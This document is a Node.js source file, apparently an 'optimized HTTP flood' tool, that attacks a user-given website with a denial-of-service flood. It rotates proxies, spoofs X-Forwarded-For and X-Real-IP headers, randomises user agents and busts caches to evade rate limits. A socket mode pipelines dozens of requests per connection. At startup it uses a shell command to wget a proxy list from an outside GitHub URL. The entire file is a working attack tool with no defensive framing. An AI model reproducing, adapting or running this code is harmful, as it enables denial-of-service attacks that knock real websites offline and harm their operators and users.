// Optimized http flood by @expodius //


//
//  Optimized http flood
//
const request = require('request');
const fs = require('fs');
const UserAgent = require('user-agents');
const URL = require('url');
const events = require('events');
const net = require('net')

events.EventEmitter.defaultMaxListeners = 3000000;
events.EventEmitter.prototype._maxListeners = 300900;

//process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0 // ssl bypass

var arguments = {
    url: process.argv[2],                     // url
    host: URL.parse(process.argv[2]).host,    // host
    proxy: process.argv[3],                   // proxy file
    mode: process.argv[4],                    // mode (http/socket)
    time: parseInt(process.argv[5]),          // boot time
    rps: 1000/parseInt(process.argv[6]),      // rps (bypass ratelimit)
    cache: process.argv[7]                    // bypass cache with random get True/False
};

const usage = "usage: <url> <proxy_file> <mode (http/socket)> <time> <rps> <cache bypass (True/False)>"
if(process.argv[5] == null) return console.log(usage);

function randomByte() {

    return Math.round(Math.random() * 256);
}

function randomIp() {
    const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

    return isPrivate(ip) ? ip : randomIp();
}
function isPrivate(ip){
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}
var ips_spoofed = [];
for(let i = 0; i < 200; i++){
    ips_spoofed.push(randomIp());
}

function get_fake_ips(){
    let xforwarded = "";
    for(let i = 0; i < (6 ? Math.round(Math.random() * (6 - 4)) + 6 : Math.round(Math.random() * 4)); i++){
        xforwarded += ips_spoofed[Math.floor(Math.random() * ips_spoofed.length)] + ", ";
    }
    return xforwarded.slice(0, -2);
}

function getUA() {

    return new UserAgent().toString();
}

const execSync = require('child_process').execSync;
execSync('rm -rf http.txt;wget "https://raw.githubusercontent.com/blackadmin7464/proxy1111/main/proxu.txt" -O http.txt');
console.log('[+] Success Get Proxy! [+]')



// getting cookies and headers
function generatePayloadHTTP(arguments, proxy, ua) {
	let headers = {
	    'Connection': 'keep-alive',
	    'Host': arguments.host,
	    'Cache-Control': 'no-cache',
	    'Pragma': 'no-cache',
	    'Upgrade-Insecure-Requests': 1,
	    'User-Agent': ua,
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	    'Accept-Language': 'en-US,en;q=0.9'
	}

	request({
        method: 'GET',
        url: arguments.url,
        gzip: true,
        followAllRedirects: true,
        maxRedirects: 20,
        proxy: "http://" + proxy,
        headers: headers
    }, (err, res, body) => { 
        if (!err) {
        	try{
        		var cookie = res.headers['set-cookie'];
	        	if (cookie.length > 5) {
	        		headers = {
	        			'Connection': 'keep-alive',
	        			'Host': arguments.host,
					    'Cache-Control': 'no-cache',
					    'Pragma': 'no-cache',
					    'Upgrade-Insecure-Requests': 1,
					    'User-Agent': ua,
					    'Cookie': cookie,
					    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
					    'Accept-Language': 'en-US,en;q=0.9'
	        		}
                    console.log(headers);
                    return headers;
	        	}
        	}catch(e){ return headers; }
        } 
        else if (err) {
            return null;
        }
    });
}

function floodHTTP(arguments, proxy, ua) {
    let payload = generatePayloadHTTP(arguments, proxy, ua);
	var random = '';
	var loop = setInterval(() => {
		if (arguments.cache == 'True') {
			random = '?'+randomByte()
		}
      	request({
            method: 'GET',
            url: arguments.url+random,
            gzip: true,
            followAllRedirects: true,
            maxRedirects: 20,
            proxy: "http://" + proxy,
            headers: payload
        }, (err, res, body) => { 
            if (err) {
            	clearInterval(loop);
            }
        });
    }, arguments.rps);
}


function socket_generate_payload(args, ua){
    let headers = "";
    headers += 'GET ' + args.url + ' HTTP/1.1' + '\r\n'
    headers += 'Host: ' + args.host + '\r\n'
    headers += 'Connection: keep-alive' + '\r\n'
    headers += 'User-Agent: ' + ua + '\r\n'
    headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' + '\r\n'
    headers += 'Accept-Language: en-US,en;q=0.9' + '\r\n'
    headers += 'Accept-Encoding: gzip, deflate, br' + '\r\n'
    headers += 'Pragma: no-cache' + '\r\n'
    headers += 'Upgrade-Insecure-Requests: 1' + '\r\n'
    headers += 'X-Real-IP: ' + get_fake_ips() + '\r\n'
    headers += 'X-Forwarded-For: ' + get_fake_ips() + '\r\n'
    headers += '\r\n';

    return headers;
}

function socket_flood(args, proxy, ua){
    setInterval(() => {
        let payload = socket_generate_payload(args, ua);
        try{
            let socket = net.connect(proxy.split(':')[1], proxy.split(':')[0]);
            //console.log(payload)
            socket.setKeepAlive(true, 50000)
            socket.setTimeout(50000);
            socket.once('error', err => {
            });
            socket.once('disconnect', () => {
            });
            socket.once('data', data => {
            });
            for (let j = 0; j < 40; j++) {
                socket.write(payload);
            }
            socket.on('data', function() {
                setTimeout(function() {
                    socket.destroy();
                    return delete socket;
                }, 5000);
            })
        }catch(e){}
    });
}


function start(arguments) {

    proxies = fs.readFileSync(arguments.proxy, 'utf-8').toString().replace(/\r/g, '').split('\n');

    console.log(`Starting ${arguments.mode} flood on ${arguments.url} for ${arguments.time} second(s)`)

    for(let i = 0; i < proxies.length; i++){
    	let ua = getUA();
        let proxy = proxies[i];
        start_flood(arguments, proxy, ua);
    }
}

function start_flood(arguments, proxy, ua){
    if(arguments.mode == "http") floodHTTP(arguments, proxy, ua)
    if(arguments.mode == "socket") socket_flood(arguments, proxy, ua)
}

// bye-bye

setTimeout(() => {
    process.exit(4);
}, (arguments.time * 1000));

process.on('uncaughtException', function(e) {
    console.warn(e);
}).on('unhandledRejection', function(e) {
    console.warn(e);
}).on('warning', e => {
    console.warn(e);
}).setMaxListeners(0);


start(arguments);

// Optimized http flood by @expodius //
